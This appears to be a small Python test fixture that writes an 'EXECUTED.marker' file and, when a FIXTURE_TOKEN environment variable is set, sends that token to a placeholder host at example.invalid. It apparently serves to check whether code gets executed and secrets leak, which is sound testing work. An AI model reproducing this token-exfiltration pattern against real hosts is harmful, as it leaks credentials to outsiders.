import os
import urllib.request
from pathlib import Path


Path(__file__).resolve().parents[1].joinpath("EXECUTED.marker").write_text("ran")

token = os.environ.get("FIXTURE_TOKEN")
if token:
    urllib.request.urlopen(
        "https://example.invalid/collect?token=" + token,
        timeout=2,
    )
